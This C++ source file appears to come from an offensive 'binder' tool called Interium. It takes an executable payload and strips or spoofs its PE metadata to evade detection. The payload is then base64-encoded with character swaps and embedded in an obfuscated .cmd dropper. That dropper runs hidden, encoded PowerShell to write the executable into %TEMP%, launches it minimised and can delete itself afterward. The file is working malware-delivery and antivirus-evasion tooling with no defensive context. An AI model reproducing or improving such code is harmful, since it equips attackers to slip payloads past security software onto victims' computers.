#include "binder.h"
#include "bat_obfuscator.h"
#include "pe.h"
#include <fstream>
#include <sstream>
#include <iostream>
#include <random>
#include <algorithm>
#include <cstring>

namespace Interium {

static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static std::string base64Encode(const std::vector<u8>& data) {
    std::string result;
    result.reserve(((data.size() + 2) / 3) * 4);

    for (size_t i = 0; i < data.size(); i += 3) {
        u32 n = (u32)data[i] << 16;
        if (i + 1 < data.size()) n |= (u32)data[i + 1] << 8;
        if (i + 2 < data.size()) n |= (u32)data[i + 2];

        result += b64chars[(n >> 18) & 0x3F];
        result += b64chars[(n >> 12) & 0x3F];
        result += (i + 1 < data.size()) ? b64chars[(n >> 6) & 0x3F] : '=';
        result += (i + 2 < data.size()) ? b64chars[n & 0x3F] : '=';
    }
    return result;
}

static std::mt19937& rng() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    return gen;
}

static std::string randAlphaNum(int len) {
    const char* chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string result;
    result.reserve(len);
    std::uniform_int_distribution<int> dist(0, 61);
    for (int i = 0; i < len; i++) {
        result += chars[dist(rng())];
    }
    return result;
}

static bool readFile(const std::string& path, std::vector<u8>& out) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return false;
    size_t size = file.tellg();
    file.seekg(0);
    out.resize(size);
    file.read(reinterpret_cast<char*>(out.data()), size);
    return file.good();
}

static bool writeFile(const std::string& path, const std::string& content) {
    std::ofstream file(path, std::ios::binary);
    if (!file.is_open()) return false;
    file.write(content.data(), content.size());
    return file.good();
}

static std::string toPsBase64(const std::string& asciiStr) {
    std::vector<u8> utf16;
    utf16.reserve(asciiStr.size() * 2);
    for (char c : asciiStr) {
        utf16.push_back(c);
        utf16.push_back(0);
    }
    return base64Encode(utf16);
}

static std::string generateRawScript(
    BatObfuscator& obf,
    const BinderConfig& cfg
) {
    std::ostringstream cmd;

    std::string tempExeName = randAlphaNum(8) + ".exe";
    std::string varTempDir = obf.r_Var();
    std::string varExeFile = obf.r_Var();
    std::string varBatScript = obf.r_Var();

    cmd << "@echo off\n";

    if (cfg.batLevel >= Level::MID) {
        cmd << "setlocal EnableDelayedExpansion\n";
    }

    cmd << "set \"" << varBatScript << "=%~f0\"\n";
    cmd << "set \"" << varTempDir << "=%TEMP%\"\n";
    cmd << "set \"" << varExeFile << "=%" << varTempDir << "%\\" << tempExeName << "\"\n";

    std::string ps1 = 
        "$w='WriteAllBytes';"
        "$r='ReadAllText';"
        "$f=[System.IO.File];"
        "$a=$f::$r($env:" + varBatScript + ");"
        "$s=$a.IndexOf(':_S_:');"
        "$e=$a.IndexOf(':_E_:');"
        "$d=$a.Substring($s+5,$e-$s-5).Replace(\"`r\",'').Replace(\"`n\",'').Replace('!','A').Replace('@','B');"
        "$c=[System.Convert];"
        "$fb='FromBase64String';"
        "$b=$c::$fb($d);"
        "$f::$w($env:" + varExeFile + ",$b);";

    std::string psEncoded = toPsBase64(ps1);
    auto psAtom = obf.a_Str("powershell");
    cmd << psAtom.declarations;

    cmd << psAtom.resultVar << " -NoP -NonI -WindowStyle Hidden -e " << psEncoded << " >nul 2>&1\n";

    if (cfg.h_Exec) {
        auto startAtom = obf.a_Str("start");
        cmd << startAtom.declarations;
        cmd << startAtom.resultVar << " /min /b \"\" \"%" << varExeFile << "%\"\n";
    } else {
        auto startAtom = obf.a_Str("start");
        cmd << startAtom.declarations;
        cmd << startAtom.resultVar << " \"\" \"%" << varExeFile << "%\"\n";
    }

    cmd << "ping -n 3 127.0.0.1 >nul 2>&1\n";

    if (cfg.s_Del) {
        auto cmdExeAtom = obf.a_Str("cmd");
        cmd << cmdExeAtom.declarations;
        cmd << cmdExeAtom.resultVar << " /c \"ping -n 5 127.0.0.1 >nul & del /f /q \"%~f0\" >nul 2>&1\"\n";
    }

    if (cfg.batLevel >= Level::MID) {
        cmd << "endlocal\n";
    }

    cmd << "exit /b 0\n";
    return cmd.str();
}

bool g_Cmd(const BinderConfig& cfg) {
    std::vector<u8> payload;
    if (!readFile(cfg.i_Exe, payload)) {
        std::cerr << "Failed to read payload: " << cfg.i_Exe << "\n";
        return false;
    }
    std::cout << "Read payload: " << payload.size() << " bytes\n";

    if (cfg.a_PeObf) {
        PEFile pe;
        std::string tempPePath = cfg.i_Exe + ".tmp_obf";
        {
            std::ofstream tmp(tempPePath, std::ios::binary);
            tmp.write(reinterpret_cast<char*>(payload.data()), payload.size());
        }

        if (pe.load(tempPePath)) {
            Stats stats;

            std::cout << "Applying PE obfuscation (level: "
                      << (cfg.peLevel == Level::LOW ? "low" : cfg.peLevel == Level::MID ? "mid" : "high")
                      << ")...\n";

            cleanMetadata(pe, stats);
            cleanRichHeader(pe, stats);
            killDosStub(pe, stats);
            renameSections(pe, stats);

            if (cfg.peLevel >= Level::MID) {
                spoofPECharacteristics(pe, stats);
                shuffleImports(pe, stats);
            }

            if (cfg.peLevel >= Level::HIGH) {
                addOverlay(pe, cfg.peLevel, stats);
            }

            fixChecksum(pe);
            payload = pe.data();

            std::cout << "PE obfuscation applied (metadata: " << stats.metadataCleaned
                      << ", sections: " << stats.sectionsRenamed
                      << ", imports: " << stats.importsHidden << ")\n";
        } else {
            std::cout << "Warning: skipping PE obfuscation\n";
        }
        std::remove(tempPePath.c_str());
    }

    std::cout << "Encoding (" << payload.size() << " bytes)...\n";
    std::string b64 = base64Encode(payload);

    for (char& c : b64) {
        if (c == 'A') c = '!';
        else if (c == 'B') c = '@';
    }
    
    std::cout << "Base64 size: " << b64.size() << " chars\n";

    BatObfuscator obf(cfg.batLevel);
    std::string rawScript = generateRawScript(obf, cfg);
    std::cout << "Obfuscating .cmd (level: "
              << (cfg.batLevel == Level::LOW ? "low" : cfg.batLevel == Level::MID ? "mid" : "high")
              << ")...\n";
    std::string obfuscatedScript = obf.obfuscate(rawScript);

    std::ostringstream finalOutput;
    finalOutput << ":: Interium Obfuscator\n";
    finalOutput << obfuscatedScript << "\n";
    finalOutput << ":_S_:\n";

    const int LINE_LEN = 76;
    for (size_t i = 0; i < b64.size(); i += LINE_LEN) {
        size_t len = std::min((size_t)LINE_LEN, b64.size() - i);
        finalOutput << b64.substr(i, len) << "\n";
    }
    finalOutput << ":_E_:\n";

    std::string raw = finalOutput.str();
    std::string crlf;
    crlf.reserve(raw.size() + raw.size() / 20);
    for (char c : raw) {
        if (c == '\n') crlf += '\r';
        crlf += c;
    }

    if (!writeFile(cfg.o_Cmd, crlf)) {
        std::cerr << "Failed to write output: " << cfg.o_Cmd << "\n";
        return false;
    }

    std::cout << "Output: " << cfg.o_Cmd << " (" << crlf.size() << " bytes)\n";
    return true;
}

}
